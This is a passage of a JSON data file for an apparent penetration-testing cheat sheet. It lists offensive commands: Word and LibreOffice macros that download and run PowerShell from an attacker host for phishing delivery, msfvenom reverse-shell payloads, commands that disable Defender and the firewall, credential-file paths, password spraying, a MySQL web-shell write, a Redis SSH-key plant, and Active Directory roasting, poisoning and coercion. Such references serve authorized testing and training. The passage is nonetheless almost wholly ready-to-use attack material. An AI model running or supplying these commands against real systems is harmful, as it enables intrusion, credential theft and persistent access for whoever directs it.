            "desc": "Donut (.NET/PE to shellcode)",
            "subdesc": "",
            "cmd": [
              "donut -i payload.exe -o payload.bin"
            ]
          },
          {
            "desc": "PowerShell Obfuscation",
            "subdesc": "",
            "cmd": [
              "Invoke-Obfuscation"
            ]
          },
          {
            "desc": "UPX Packing",
            "subdesc": "",
            "cmd": [
              "upx -9 payload.exe"
            ]
          },
          {
            "desc": "windows: Disable Defender",
            "subdesc": "",
            "cmd": [
              "Set-MpPreference -DisableRealtimeMonitoring $true"
            ]
          },
          {
            "desc": "windows: Disable Firewall",
            "subdesc": "",
            "cmd": [
              "netsh advfirewall set allprofiles state off"
            ]
          }
        ]
      },
      {
        "id": "exploit-macros",
        "name": "Malicious Macros",
        "description": "Word/LibreOffice VBA macros for PowerShell download-and-execute payloads.",
        "commands": [
          {
            "desc": "Word VBA Macro (AutoOpen)",
            "subdesc": "",
            "cmd": [
              "Sub AutoOpen()",
              "  CreateObject(\"Wscript.Shell\").Run \"cmd /c powershell -ep bypass -nop IEX(New-Object Net.WebClient).DownloadString('http://<LHOST>/shell.ps1')\"",
              "End Sub"
            ]
          },
          {
            "desc": "LibreOffice Macro",
            "subdesc": "",
            "cmd": [
              "Sub Main",
              "  Shell(\"cmd /c powershell -ep bypass -nop IWR -uri http://<LHOST>/shell.ps1 -OutFile C:\\Windows\\Temp\\shell.ps1; C:\\Windows\\Temp\\shell.ps1\")",
              "End Sub"
            ]
          },
          {
            "desc": "macro-generator.py",
            "subdesc": "",
            "cmd": [
              "python3 macro-generator.py <LHOST> <LPORT>"
            ]
          },
          {
            "desc": "Delivery",
            "subdesc": "Embed in .doc/.docm, send via phishing",
            "cmd": [
              ""
            ]
          }
        ]
      },
      {
        "id": "exploit-bof",
        "name": "Buffer Overflow",
        "description": "Stack overflow methodology: spike, fuzz, offset, EIP, badchars, JMP ESP, shellcode.",
        "commands": [
          {
            "desc": "1. Spiking",
            "subdesc": "",
            "cmd": [
              "generic_send_tcp <TARGET> <PORT> spike.spk 0 0"
            ]
          },
          {
            "desc": "2. Fuzzing",
            "subdesc": "Send increasing buffer until crash",
            "cmd": [
              ""
            ]
          },
          {
            "desc": "3. Finding Offset",
            "subdesc": "",
            "cmd": [
              "msf-pattern_create -l <length>"
            ]
          },
          {
            "desc": "4. Overwriting EIP",
            "subdesc": "",
            "cmd": [
              "msf-pattern_offset -l <length> -q <EIP_value>"
            ]
          },
          {
            "desc": "5. Finding Bad Characters",
            "subdesc": "Send all chars (\\x01-\\xff), remove bad ones",
            "cmd": [
              ""
            ]
          },
          {
            "desc": "6. Finding Right Module",
            "subdesc": "No ASLR/DEP/SafeSEH",
            "cmd": [
              "!mona modules"
            ]
          },
          {
            "desc": "7. Finding JMP ESP",
            "subdesc": "",
            "cmd": [
              "!mona find -s \"\\xff\\xe4\" -m <module>"
            ]
          },
          {
            "desc": "8. Generating Shellcode",
            "subdesc": "",
            "cmd": [
              "msfvenom -p windows/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> EXITFUNC=thread -b \"\\x00\" -f python"
            ]
          },
          {
            "desc": "Tools",
            "subdesc": "",
            "cmd": [
              "Immunity Debugger + mona.py"
            ]
          }
        ]
      },
      {
        "id": "exploit-git",
        "name": "Git Repositories",
        "description": "Dump exposed .git dirs, scan for secrets with gitleaks/trufflehog, and review commit history.",
        "commands": [
          {
            "desc": "Dump Exposed .git",
            "subdesc": "",
            "cmd": [
              "wget -r http://<TARGET>/.git/",
              "git-dumper http://<TARGET>/.git/ <LOCAL-DIR>"
            ]
          },
          {
            "desc": "Scan for Secrets",
            "subdesc": "",
            "cmd": [
              "gitleaks dir -v",
              "trufflehog filesystem <LOCAL-DIR>"
            ]
          },
          {
            "desc": "Review History",
            "subdesc": "",
            "cmd": [
              "git log --oneline",
              "git show <COMMIT>",
              "git diff <COMMIT1> <COMMIT2>"
            ]
          },
          {
            "desc": "Search for Sensitive Data",
            "subdesc": "",
            "cmd": [
              "git log -p --all -S 'password'",
              "git log -p --all -S 'secret'"
            ]
          }
        ]
      },
      {
        "id": "exploit-winconf",
        "name": "Windows: Configuration Files",
        "description": "SAM/SYSTEM, Unattend.xml, web.config, PS history, WiFi creds, and registry autologon.",
        "commands": [
          {
            "desc": "SAM/SYSTEM (local hashes)",
            "subdesc": "",
            "cmd": [
              "C:\\Windows\\System32\\config\\SAM",
              "C:\\Windows\\System32\\config\\SYSTEM"
            ]
          },
          {
            "desc": "Unattend/Sysprep (cleartext creds)",
            "subdesc": "",
            "cmd": [
              "C:\\Windows\\Panther\\Unattend.xml",
              "C:\\Windows\\Panther\\unattend\\Unattend.xml",
              "C:\\Windows\\System32\\sysprep\\sysprep.xml"
            ]
          },
          {
            "desc": "Web Configs",
            "subdesc": "",
            "cmd": [
              "C:\\inetpub\\wwwroot\\web.config"
            ]
          },
          {
            "desc": "PowerShell History",
            "subdesc": "",
            "cmd": [
              "C:\\Users\\<USER>\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt"
            ]
          },
          {
            "desc": "WiFi Passwords",
            "subdesc": "",
            "cmd": [
              "netsh wlan show profile <NAME> key=clear"
            ]
          },
          {
            "desc": "Registry Autologon",
            "subdesc": "",
            "cmd": [
              "reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\""
            ]
          }
        ]
      },
      {
        "id": "exploit-linconf",
        "name": "Linux: Configuration Files",
        "description": "Credentials, web configs, crontabs, SSH keys, service configs, and /proc leaks.",
        "commands": [
          {
            "desc": "User Credentials",
            "subdesc": "",
            "cmd": [
              "/etc/passwd",
              "/etc/shadow",
              "/home/<USER>/.bash_history",
              "/home/<USER>/.ssh/id_rsa"
            ]
          },
          {
            "desc": "Web Application Configs",
            "subdesc": "",
            "cmd": [
              "/var/www/html/.env",
              "/var/www/html/wp-config.php",
              "/var/www/html/config.php"
            ]
          },
          {
            "desc": "Service Configs",
            "subdesc": "",
            "cmd": [
              "/etc/crontab",
              "/etc/cron.d/*",
              "/etc/exports",
              "/etc/fstab"
            ]
          },
          {
            "desc": "Proc Leaks",
            "subdesc": "",
            "cmd": [
              "/proc/self/environ",
              "/proc/self/cmdline"
            ]
          },
          {
            "desc": "SSH Configs",
            "subdesc": "",
            "cmd": [
              "/etc/ssh/sshd_config",
              "/root/.ssh/authorized_keys"
            ]
          }
        ]
      },
      {
        "id": "exploit-db",
        "name": "Databases",
        "description": "PostgreSQL, MySQL/MariaDB, MSSQL (xp_cmdshell, xp_dirtree), and SQLite3 commands.",
        "commands": [
          {
            "desc": "PostgreSQL",
            "subdesc": "",
            "cmd": [
              "psql -h <TARGET_IP> -U <USER> -d <DB>",
              "\\list  \\dt  \\du",
              "SELECT * FROM pg_shadow;"
            ]
          },
          {
            "desc": "MySQL / MariaDB",
            "subdesc": "",
            "cmd": [
              "mysql -h <TARGET_IP> -u <USER> -p",
              "SHOW DATABASES; USE <DB>; SHOW TABLES;",
              "SELECT user, authentication_string FROM mysql.user;"
            ]
          },
          {
            "desc": "MSSQL",
            "subdesc": "xp_cmdshell, xp_dirtree hash stealing",
            "cmd": [
              "impacket-mssqlclient <USER>:<PASS>@<TARGET_IP>",
              "SELECT name FROM sys.databases;",
              "EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;",
              "EXEC xp_cmdshell 'whoami';",
              "EXEC xp_dirtree '\\\\<LHOST>\\share', 1, 1;"
            ]
          },
          {
            "desc": "SQLite",
            "subdesc": "",
            "cmd": [
              "sqlite3 <file.db>",
              ".tables",
              "SELECT * FROM <table>;"
            ]
          }
        ]
      },
      {
        "id": "exploit-tunnel",
        "name": "Tunneling",
        "description": "SSH local/remote/dynamic forwarding, proxychains, Chisel, and Ligolo-ng.",
        "commands": [
          {
            "desc": "SSH Local Port Forward",
            "subdesc": "Access remote:port from localhost",
            "cmd": [
              "ssh -L <LPORT>:<REMOTE>:<RPORT> <USER>@<PIVOT>",
              "# Connect to: localhost:<LPORT>"
            ]
          },
          {
            "desc": "SSH Remote Port Forward",
            "subdesc": "Expose local service to pivot",
            "cmd": [
              "ssh -R <RPORT>:localhost:<LPORT> <USER>@<PIVOT>"
            ]
          },
          {
            "desc": "SSH Dynamic SOCKS Proxy",
            "subdesc": "",
            "cmd": [
              "ssh -D 1080 <USER>@<PIVOT>",
              "# Configure proxychains: socks5 127.0.0.1 1080",
              "proxychains nmap -sT <INTERNAL_TARGET>"
            ]
          },
          {
            "desc": "Chisel",
            "subdesc": "",
            "cmd": [
              "# Attacker:",
              "chisel server -p 8080 --reverse",
              "# Target:",
              "chisel client <LHOST>:8080 R:<LPORT>:<TARGET>:<RPORT>"
            ]
          },
          {
            "desc": "Ligolo-ng",
            "subdesc": "",
            "cmd": [
              "# Attacker:",
              "ligolo-proxy -selfcert -laddr 0.0.0.0:11601",
              "# Target:",
              "ligolo-agent -connect <LHOST>:11601 -ignore-cert"
            ]
          }
        ]
      },
      {
        "id": "exploit-bloodhound",
        "name": "Bloodhound",
        "description": "neo4j setup, BloodHound-Python/SharpHound collection, and key AD attack path queries.",
        "commands": [
          {
            "desc": "Start neo4j",
            "subdesc": "Default creds: neo4j / neo4j",
            "cmd": [
              "sudo neo4j start"
            ]
          },
          {
            "desc": "BloodHound Python Collector (remote)",
            "subdesc": "",
            "cmd": [
              "bloodhound-python -c All -u <USER> -p <PASS> -d <DOMAIN> -ns <DC_IP>"
            ]
          },
          {
            "desc": "SharpHound (.NET on target)",
            "subdesc": "",
            "cmd": [
              ".\\SharpHound.exe -c All"
            ]
          },
          {
            "desc": "Import",
            "subdesc": "",
            "cmd": [
              "# Open BloodHound GUI > Upload Data > select .zip"
            ]
          },
          {
            "desc": "Key Queries",
            "subdesc": "",
            "cmd": [
              "# Find Shortest Paths to Domain Admins",
              "# Find AS-REP Roastable Users",
              "# Find Kerberoastable Users",
              "# Shortest Path from Owned Principals"
            ]
          }
        ]
      },
      {
        "id": "exploit-metasploit",
        "name": "Metasploit",
        "description": "msfdb init, workspaces, module search, multi/handler, and Meterpreter basics.",
        "commands": [
          {
            "desc": "Initialize",
            "subdesc": "",
            "cmd": [
              "msfdb init",
              "msfconsole -q"
            ]
          },
          {
            "desc": "Workspaces",
            "subdesc": "",
            "cmd": [
              "workspace -a <NAME>",
              "db_nmap -sV <TARGET_IP>"
            ]
          },
          {
            "desc": "Search & Use",
            "subdesc": "",
            "cmd": [
              "search <TERM>",
              "use <MODULE>",
              "show options",
              "set RHOSTS <TARGET_IP>",
              "set LHOST <LHOST>",
              "run"
            ]
          },
          {
            "desc": "Multi/Handler",
            "subdesc": "",
            "cmd": [
              "use exploit/multi/handler",
              "set PAYLOAD windows/x64/meterpreter/reverse_tcp",
              "set LHOST 0.0.0.0",
              "set LPORT <LPORT>",
              "run"
            ]
          },
          {
            "desc": "Meterpreter Basics",
            "subdesc": "",
            "cmd": [
              "sysinfo",
              "getuid",
              "hashdump",
              "upload / download",
              "shell",
              "bg"
            ]
          }
        ]
      },
      {
        "id": "exploit-msfvenom",
        "name": "msfvenom",
        "description": "Windows/Linux/Web payloads in exe, elf, php, jsp, asp, war, and shellcode formats.",
        "commands": [
          {
            "desc": "Windows x64 Staged",
            "subdesc": "",
            "cmd": [
              "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe -o shell.exe"
            ]
          },
          {
            "desc": "Windows x86 Stageless",
            "subdesc": "",
            "cmd": [
              "msfvenom -p windows/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe -o shell.exe"
            ]
          },
          {
            "desc": "Linux ELF",
            "subdesc": "",
            "cmd": [
              "msfvenom -p linux/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f elf -o shell.elf"
            ]
          },
          {
            "desc": "Web Payloads",
            "subdesc": "",
            "cmd": [
              "msfvenom -p php/reverse_php LHOST=<LHOST> LPORT=<LPORT> -o shell.php",
              "msfvenom -p java/jsp_shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -o shell.jsp",
              "msfvenom -p windows/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f asp -o shell.asp"
            ]
          },
          {
            "desc": "Shellcode (Python)",
            "subdesc": "",
            "cmd": [
              "msfvenom -p windows/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -b \"\\x00\" EXITFUNC=thread -f python"
            ]
          },
          {
            "desc": "Common Formats",
            "subdesc": "",
            "cmd": [
              "# exe, elf, dll, asp, aspx, jsp, war, php, py, ps1, hta, vba"
            ]
          }
        ]
      },
      {
        "id": "exploit-squid",
        "name": "SQUID Proxy",
        "description": "Open proxy checks with curl, spose.py internal port scanning, and proxychains pivoting.",
        "commands": [
          {
            "desc": "Check for Open Proxy",
            "subdesc": "",
            "cmd": [
              "curl --proxy http://<TARGET_IP>:3128 http://127.0.0.1"
            ]
          },
          {
            "desc": "Scan Internal Ports through SQUID",
            "subdesc": "",
            "cmd": [
              "python3 spose.py --proxy http://<TARGET_IP>:3128 --target 127.0.0.1"
            ]
          },
          {
            "desc": "Configure Proxychains for SQUID",
            "subdesc": "",
            "cmd": [
              "# /etc/proxychains.conf: http <TARGET_IP> 3128",
              "proxychains nmap -sT 127.0.0.1"
            ]
          },
          {
            "desc": "Access Internal Services",
            "subdesc": "",
            "cmd": [
              "curl --proxy http://<TARGET_IP>:3128 http://127.0.0.1:8080"
            ]
          }
        ]
      },
      {
        "id": "exploit-ade",
        "name": "ActiveDirectoryEnum",
        "description": "Project reference: https://github.com/CasperGN/ActiveDirectoryEnumeration",
        "commands": [
          {
            "desc": "Repository",
            "subdesc": "",
            "cmd": [
              "https://github.com/CasperGN/ActiveDirectoryEnumeration"
            ]
          },
          {
            "desc": "Usage",
            "subdesc": "",
            "cmd": [
              "-h, --help            show this help message and exit",
              "--dc DC               Hostname of the Domain Controller",
              "-o OUT_FILE, --out-file OUT_FILE",
              "                      Path to output file. If no path, CWD is assumed (default: None)",
              "-u USER, --user USER  Username of the domain user to query with. The username has to be domain name as `user@domain.org`",
              "-s, --secure          Try to estalish connection through LDAPS",
              "-smb, --smb           Force enumeration of SMB shares on all computer objects fetched",
              "-kp, --kerberos_preauth",
              "                      Attempt to gather users that does not require Kerberos preauthentication",
              "-bh, --bloodhound     Output data in the format expected by BloodHound",
              "-spn                  Attempt to get all SPNs and perform Kerberoasting",
              "-sysvol               Search sysvol for GPOs with cpassword and decrypt it",
              "--all                 Run all checks",
              "--no-creds            Start without credentials",
              "--dry-run             Don't execute a test but run as if. Used for testing params etc.",
              "--exploit EXPLOIT     Show path to PoC exploit code"
            ]
          }
        ]
      },
      {
        "id": "exploit-adx",
        "name": "Active Directory Exploitation",
        "description": "enum4linux-ng, CrackMapExec, impacket secretsdump/GetADUsers, and ldapdomaindump.",
        "commands": [
          {
            "desc": "enum4linux-ng",
            "subdesc": "",
            "cmd": [
              "enum4linux-ng -A <TARGET_IP>"
            ]
          },
          {
            "desc": "CrackMapExec",
            "subdesc": "",
            "cmd": [
              "crackmapexec smb <TARGET_IP> -u <USER> -p <PASS> --users",
              "crackmapexec smb <TARGET_IP> -u <USER> -p <PASS> --shares",
              "crackmapexec smb <TARGET_IP> -u <USER> -p <PASS> -M spider_plus"
            ]
          },
          {
            "desc": "impacket",
            "subdesc": "",
            "cmd": [
              "impacket-secretsdump <DOMAIN>/<USER>:<PASS>@<TARGET_IP>",
              "impacket-GetADUsers <DOMAIN>/<USER>:<PASS> -dc-ip <TARGET_IP> -all"
            ]
          },
          {
            "desc": "ldapdomaindump",
            "subdesc": "",
            "cmd": [
              "ldapdomaindump -u <DOMAIN>\\\\<USER> -p <PASS> <TARGET_IP>"
            ]
          }
        ]
      },
      {
        "id": "exploit-2",
        "name": "FTP Credential Attack (21)",
        "description": "Brute force/default creds on FTP.",
        "commands": [
          {
            "desc": "",
            "subdesc": "",
            "cmd": [
              "hydra -L users.txt -P passwords.txt ftp://<TARGET_IP>",
              "medusa -h <TARGET_IP> -u <USER> -P passwords.txt -M ftp"
            ]
          }
        ]
      },
      {
        "id": "exploit-3",
        "name": "SSH Credential Attack (22)",
        "description": "Password spray and valid credential validation.",
        "commands": [
          {
            "desc": "",
            "subdesc": "",
            "cmd": [
              "hydra -L users.txt -P rockyou.txt ssh://<TARGET_IP>",
              "ssh <USER>@<TARGET_IP>"
            ]
          }
        ]
      },
      {
        "id": "exploit-4",
        "name": "SMTP Relay / VRFY Abuse (25/465/587)",
        "description": "Test relay misconfig and user enumeration.",
        "commands": [
          {
            "desc": "",
            "subdesc": "",
            "cmd": [
              "swaks --to test@domain.local --from attacker@domain.local --server <TARGET_IP>",
              "nmap --script smtp-open-relay,smtp-enum-users -p25,465,587 <TARGET_IP>"
            ]
          }
        ]
      },
      {
        "id": "exploit-6",
        "name": "Windows: Kerberos AS-REP / Kerberoast (88)",
        "description": "Domain credential extraction via Kerberos.",
        "commands": [
          {
            "desc": "",
            "subdesc": "",
            "cmd": [
              "impacket-GetNPUsers <DOMAIN>/ -dc-ip <TARGET_IP> -usersfile users.txt -format hashcat",
              "impacket-GetUserSPNs <DOMAIN>/<USER>:<PASS> -dc-ip <TARGET_IP> -request"
            ]
          }
        ]
      },
      {
        "id": "exploit-5",
        "name": "IMAP/POP Mailbox Brute (110/143/993/995)",
        "description": "Mailbox auth attacks.",
        "commands": [
          {
            "desc": "",
            "subdesc": "",
            "cmd": [
              "hydra -L users.txt -P passwords.txt imap://<TARGET_IP>",
              "hydra -L users.txt -P passwords.txt pop3://<TARGET_IP>"
            ]
          }
        ]
      },
      {
        "id": "exploit-7",
        "name": "RPC/SMB Null Session & Share Abuse (135/139/445)",
        "description": "Anonymous/domain share abuse paths.",
        "commands": [
          {
            "desc": "",
            "subdesc": "",
            "cmd": [
              "rpcclient -U \"\" -N <TARGET_IP>",
              "crackmapexec smb <TARGET_IP> -u <USER> -p <PASS> --shares"
            ]
          }
        ]
      },
      {
        "id": "exploit-8",
        "name": "SMB Remote Exec (445)",
        "description": "Command execution through SMB with valid creds/hash.",
        "commands": [
          {
            "desc": "",
            "subdesc": "",
            "cmd": [
              "impacket-psexec <DOMAIN>/<USER>:<PASS>@<TARGET_IP>",
              "impacket-smbexec <DOMAIN>/<USER>:<PASS>@<TARGET_IP>"
            ]
          }
        ]
      },
      {
        "id": "exploit-9",
        "name": "Windows: LDAP Credentialed Abuse (389/636/3268/3269)",
        "description": "Enumerate AD abuse paths with valid creds.",
        "commands": [
          {
            "desc": "",
            "subdesc": "",
            "cmd": [
              "ldapsearch -x -H ldap://<TARGET_IP> -D \"<USER_DN>\" -w <PASS> -b \"dc=domain,dc=local\"",
              "python3 bloodhound.py -c All -u <USER> -p <PASS> -d <DOMAIN> -ns <TARGET_IP>"
            ]
          }
        ]
      },
      {
        "id": "exploit-14",
        "name": "Oracle Account/SID Abuse (1521)",
        "description": "Exploit weak Oracle credentials and misconfig.",
        "commands": [
          {
            "desc": "",
            "subdesc": "",
            "cmd": [
              "odat passwordguesser -s <TARGET_IP> -d <SID>",
              "odat all -s <TARGET_IP> -d <SID> -U <USER> -P <PASS>"
            ]
          }
        ]
      },
      {
        "id": "exploit-11",
        "name": "MSSQL Command Execution (1433)",
        "description": "Leverage SQL Server to execute OS commands.",
        "commands": [
          {
            "desc": "",
            "subdesc": "",
            "cmd": [
              "impacket-mssqlclient <USER>:<PASS>@<TARGET_IP>",
              "EXEC sp_configure \"xp_cmdshell\",1;RECONFIGURE;EXEC xp_cmdshell \"whoami\";"
            ]
          }
        ]
      },
      {
        "id": "exploit-10",
        "name": "NFS no_root_squash Abuse (2049)",
        "description": "Exploit writable NFS exports for privesc foothold.",
        "commands": [
          {
            "desc": "",
            "subdesc": "",
            "cmd": [
              "mkdir /tmp/nfs",
              "mount -t nfs <TARGET_IP>:/<SHARE> /tmp/nfs",
              "cp /bin/bash /tmp/nfs/bash && chmod +s /tmp/nfs/bash"
            ]
          }
        ]
      },
      {
        "id": "exploit-12",
        "name": "MySQL UDF / File Write Abuse (3306)",
        "description": "Abuse FILE/UDF permissions on MySQL.",
        "commands": [
          {
            "desc": "",
            "subdesc": "",
            "cmd": [
              "mysql -h <TARGET_IP> -u <USER> -p",
              "SELECT @@secure_file_priv;",
              "SELECT \"<?php system($_GET[c]); ?>\" INTO OUTFILE \"/var/www/html/shell.php\";"
            ]
          }
        ]
      },
      {
        "id": "exploit-17",
        "name": "RDP Password Spray (3389)",
        "description": "Credential attack and desktop access validation.",
        "commands": [
          {
            "desc": "",
            "subdesc": "",
            "cmd": [
              "crowbar -b rdp -s <TARGET_IP>/32 -u <USER> -C passwords.txt",
              "xfreerdp /u:<USER> /p:<PASS> /v:<TARGET_IP>"
            ]
          }
        ]
      },
      {
        "id": "exploit-13",
        "name": "PostgreSQL Command Exec (5432)",
        "description": "Use PostgreSQL feature abuse for command execution.",
        "commands": [
          {
            "desc": "",
            "subdesc": "",
            "cmd": [
              "psql -h <TARGET_IP> -U <USER>",
              "COPY (SELECT \"bash -c 'id'\") TO PROGRAM \"bash\";"
            ]
          }
        ]
      },
      {
        "id": "exploit-15",
        "name": "Redis Unauthorized Write (6379)",
        "description": "Turn unauth Redis into persistence/RCE foothold.",
        "commands": [
          {
            "desc": "",
            "subdesc": "",
            "cmd": [
              "redis-cli -h <TARGET_IP>",
              "CONFIG SET dir /root/.ssh",
              "CONFIG SET dbfilename authorized_keys",
              "SET crack \"<PUBKEY>\"",
              "SAVE"
            ]
          }
        ]
      },
      {
        "id": "exploit-16",
        "name": "MongoDB Unauth Data Access (27017)",
        "description": "Exploit unauth MongoDB exposure.",
        "commands": [
          {
            "desc": "",
            "subdesc": "",
            "cmd": [
              "mongo --host <TARGET_IP> --port 27017",
              "show dbs",
              "use admin",
              "show collections"
            ]
          }
        ]
      }
    ]
  },

  /* ─── Phase 4: Active Directory Exploitation (Windows only) ─── */
  {
    "id": "active_directory_exploitation",
    "name": "Active Directory Exploitation",
    "optional": true,
    "items": [
      {
        "id": "active_directory_exploitation__no_creds",
        "name": "No Credentials",
        "description": "",
        "commands": [
          {
            "desc": "Scan network",
            "subdesc": "Vulnerable host",
            "cmd": [
              "nxc smb <ip_range>",
              "nmap -sP -p <ip>",
              "nmap -Pn -sV --top-ports 50 --open <ip>",
              "nmap -Pn --script smb-vuln* -p139,445 <ip>",
              "nmap -Pn -sC -sV -oA <output> <ip>",
              "nmap -Pn -sC -sV -p- -oA <output> <ip>",
              "nmap -sU -sC -sV -oA <output> <ip>"
            ]
          },
          {
            "desc": "Find DC IP",
            "subdesc": "",
            "cmd": [
              "nmcli dev show <interface>",
              "nslookup -type=SRV _ldap._tcp.dc._msdcs.<domain>",
              "nmap -p 88 --open <ip_range>"
            ]
          },
          {
            "desc": "Zone transfer",
            "subdesc": "",
            "cmd": [
              "dig axfr <domain_name> @<name_server>"
            ]
          },
          {
            "desc": "Anonymous & Guest access on SMB shares",
            "subdesc": "",
            "cmd": [
              "nxc smb <ip_range> -u '' -p",
              "nxc smb <ip_range> -u 'a' -p",
              "enum4linux-ng.py -a -u '' -p '' <ip>",
              "smbclient -U '%' -L //<ip>"
            ]
          },
          {
            "desc": "Enumerate LDAP",
            "subdesc": "Username",
            "cmd": [
              "nmap -n -sV --script 'ldap*' and not brute -p 389 <dc_ip>",
              "ldapsearch -x -H <dc_ip> -s base"
            ]
          },
          {
            "desc": "Enumerate Users",
            "subdesc": "Username",
            "cmd": [
              "nxc smb <dc_ip> --users",
              "nxc smb <dc_ip> --rid-brute 10000 # bruteforcing RID",
              "net rpc group members 'Domain Users' -W '<domain> -l <ip> -U '%"
            ]
          },
          {
            "desc": "Bruteforce users",
            "subdesc": "Username",
            "cmd": [
              "kerbrute userenum -d <domain> <userlist>",
              "nmap -p 88 --script=krb5-enum-users --script-args=\"krb5-enum-users.realm= '<domain>',userdb=<user_list_file>\" <dc_ip>"
            ]
          },
          {
            "desc": "Poisoning",
            "subdesc": "poisoning SMB || poisoning LDAP || poisoning HTTP",
            "cmd": [
              "LLMNR / NBTNS / MDNS",
              "responder -l <interface>",
              "⚠️ DHCPv6 (IPv6 prefered to IPv4)",
              "mitm6 -d <domain>",
              "bettercap",
              "⚠️ ARP Poisoning",
              "bettercap",
              "asreqroast",
              "Pcredz -i <interface> -v` >>> Hash found ASREQ"
            ]
          },
          {
            "desc": "Coerce",
            "subdesc": "Coerce SMB",
            "cmd": [
              "Unauthenticated PetitPotam (CVE-2022-26925) @CVE@",
              "petitpotam.py -d <domain> <listener> <target>"
            ]
          },
          {
            "desc": "PXE",
            "subdesc": "",
            "cmd": [
              "no password >>> Credentials (NAA account)",
              "pxethief.py 1",
              "pxethief.py 2 <distribution_point_ip>",
              "password protected >>> PXE Hash",
              "tftp -i <dp_ip> GET \"\\xxx\\boot.var",
              "pxethief.py 5 '\\xxx\\boot.var"
            ]
          },
          {
            "desc": "TimeRoasting",
            "subdesc": "timeroast hash",
            "cmd": [
              "timeroast.py <dc_ip> -o <output_log>"
            ]
          }
        ]
      },
      {
        "id": "active_directory_exploitation__valid_user",
        "name": "Valid User (No Password)",
        "description": "",
        "commands": [
          {
            "desc": "Password Spray",
            "subdesc": "",
            "cmd": [
              "Get password policy  (you need creds,but you should get the policy  first to avoid locking accounts)",
              "default policy",
              "nxc smb <dc_ip> -u '<user>' -p '<password>' --pass-pol",
              "[https://www.thehacker.recipes/ad/recon/password-policy](https://www.thehacker.recipes/ad/recon/password-policy)",
              "Get-ADDefaultDomainPasswordPolicy",
              "ldeep ldap -u <user> -p <password> -d <domain> -s ldap://<dc_ip> domain_policy",
              "Fined Policy (Privileged)",
              "ldapsearch-ad.py --server <dc> -d <domain> -u <user> -p <pass> --type pass-pols",
              "Get-ADFineGainedPasswordPolicy -filter *",
              "ldeep ldap -u <user> -p <password> -d <domain> -s ldap://<dc_ip> pso # can also be runned with a low priv account but less information will be available",
              "⚠️ user == password >>> Clear text Credentials",
              "nxc smb <dc_ip> -u <users.txt> -p <passwords.txt> --no-bruteforce --continue-on-success",
              "sprayhound -U <users.txt> -d <domain> -dc  <dc_ip>   # add --lower to lowercase and --upper to uppercase. Add nothing to get only user=pass",
              "⚠️ usuals passwords  (SeasonYear!, Company123, ...) >>> Clear text Credentials",
              "nxc smb <dc_ip> -u <users.txt> -p <password> --continue-on-success",
              "sprayhound -U <users.txt> -p <password> -d <domain> -dc  <dc_ip>",
              "kerbrute passwordspray -d <domain> <users.txt> <password>"
            ]
          },
          {
            "desc": "ASREPRoast",
            "subdesc": "",
            "cmd": [
              "List ASREPRoastable Users (need creds)",
              "MATCH (u:User) WHERE u.dontreqpreauth = true AND u.enabled = true RETURN u",
              "ASREP roasting >>> Hash found ASREP",
              "GetNPUsers.py <domain>/ -usersfile <users.txt> -format hashcat -outputfile <output.txt>",
              "nxc ldap <dc_ip> -u <users.txt>  -p '' --asreproast <output.txt>",
              "Rubeus.exe asreproast /format:hashcat",
              "Blind Kerberoasting >>> Hash found TGS",
              "Rubeus.exe keberoast /domain:<domain> /dc:<dcip> /nopreauth: <asrep_user> /spns:<users.txt>",
              "GetUserSPNs.py -no-preauth \"<asrep_user>\" -usersfile \"<user_list.txt>\" -dc-host \"<dc_ip>\" \"<domain>\"/",
              "CVE-2022-33679 @CVE@ >>> Lat move PTT",
              "CVE-2022-33679.py <domain>/<user> <target>"
            ]
          }
        ]
      },
      {
        "id": "active_directory_exploitation__authenticated",
        "name": "Valid Credentials",
        "description": "",
        "commands": [
          {
            "desc": "Classic Enumeration (users, shares, ACL, delegation, ...)",
            "subdesc": "",
            "cmd": [
              "Find all users >>> Username",
              "GetADUsers.py -all -dc-ip <dc_ip> <domain>/<username>",
              "nxc smb <dc_ip> -u '<user>' -p '<password>' --users",
              "Enumerate SMB share >>> Scroll shares",
              "nxc smb <ip_range> -u '<user>' -p '<password>' -M spider_plus",
              "nxc smb <ip_range> -u '<user>' -p '<password>' --shares [--get-file \\\\<filename> <filename>]",
              "manspider <ip_range> -c passw -e <file extensions> -d <domain> -u <user> -p <password>",
              "Bloodhound Legacy >>> ACL || Delegation || Username",
              "bloodhound-python -d <domain> -u <user> -p <password> -gc <dc> -c all",
              "rusthound -d <domain_to_enum> -u '<user>@<domain>' -p '<password>' -o <outfile.zip> -z",
              "import-module sharphound.ps1;invoke-bloodhound -collectionmethod all -domain <domain>",
              "sharphound.exe -c all -d <domain>",
              "Bloodhound CE >>> ACL || Delegation || Username",
              "bloodhound-python -d <domain> -u <user> -p <password> -gc <dc> -c all",
              "rusthound-ce -d <domain_to_enum> -u '<user>@<domain>' -p '<password>' -o <outfile.zip> -z --ldap-filter=(objectGuid=*)",
              "sharphound.exe -c all -d <domain>",
              "SOAPHound.exe -c c:\\temp\\cache.txt --bhdump -o c:\\temp\\bloodhound-output --autosplit --threshold 900",
              "Enumerate Ldap >>> ACL || Delegation || Username",
              "ldeep ldap -u <users> -p '<password>' -d <domain> -s ldap://<dc_ip> all <backup_folder>",
              "ldapdomaindump.py -u <user> -p <password> -o <dump_folder> ldap://<dc_ip>:389",
              "ldapsearch-ad.py -l <dc_ip> -d <domain> -u <user> -p '<password>' -o <output.log> -t all",
              "Enumerate DNS >>> New targets (low hanging fruit)",
              "adidnsdump -u <domain>\\\\<user> -p \"<password>\" --print-zones <dc_ip>"
            ]
          },
          {
            "desc": "Enumerate ADCS",
            "subdesc": "ADCS Exploitation",
            "cmd": [
              "certify.exe find",
              "certipy find -u <user>@<domain> -p '<password>' -dc-ip <dc_ip>"
            ]
          },
          {
            "desc": "Enumerate SCCM",
            "subdesc": "SCCM Exploitation",
            "cmd": [
              "sccmhunter.py find -u <user> -p <password> -d <domain> -dc-ip <dc_ip> -debug",
